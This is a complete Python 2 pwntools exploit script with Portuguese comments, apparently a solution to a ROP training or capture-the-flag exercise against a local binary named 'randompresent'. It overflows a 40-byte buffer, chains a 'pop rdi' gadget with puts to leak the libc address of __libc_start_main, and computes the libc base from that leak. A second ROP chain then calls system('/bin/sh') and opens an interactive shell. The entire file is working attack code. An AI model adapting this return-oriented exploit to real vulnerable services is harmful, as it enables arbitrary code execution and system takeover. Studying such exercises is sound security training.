#!/usr/bin/python2

# Links dos slides: https://speakerdeck.com/milkmix/advanced-exploitation-on-linux-rop-and-infoleaks
# Outros exercicios: https://github.com/0xmilkmix/training/tree/master/hacklu


from pwn import *

p = process("./randompresent")
libc = ELF("/usr/lib/libc.so.6")
############################################

# pop rdi ; ret -> Local onde tem
# Vai ser argumento para o print (puts)
ropgadget = p64(0x040077b)

# Endereco Base GOT
libc_start_main_ptr = p64(0x600ff0)

# Addr puts
putsaddr = p64(0x0400550)


# 32 Bytes do buffer + 8 do EBP
basepayload = (32+8) * "A"

# Addr funcao main
mainaddr = p64(0x0400676)

#############################################
    # Fazendo o Leak da LIBC 

p.recvline()
p.recvline()

ropchain = basepayload + ropgadget + libc_start_main_ptr + putsaddr + mainaddr

p.sendline(ropchain)

##############################################

from Crypto.Util.number import bytes_to_long

# Recebe leak e descarta 0xa (\n)
libc_start_main = bytes_to_long(p.recvline()[-2::-1])
log.info("Addr libc_start_main:" + hex(libc_start_main))

#Jeito alternativo de pegar retorno
# addrtmp = p.recvline(False)
# libc_start_main = u64(addrtmp.ljust(8, '\x00'))
# log.info("Addr alternativo %x", libc_start_main)

# Tomando a base da libc e o simbolo da nossa, temos o offset
libc.address = libc_start_main - libc.sym["__libc_start_main"]
log.info("Addr my libc: " + hex(libc.address))

###############################################
    # Chamando system("/bin/sh")

# Pegando addr da string /bin/sh no binario
addrbinsh = p64(next(libc.search("/bin/sh")))

# Pegando addr func. system
addrsystem = p64(libc.sym["system"])

rop2 = basepayload + ropgadget + addrbinsh + addrsystem

p.recvline()
p.recvline()
p.sendline(rop2)

p.interactive()
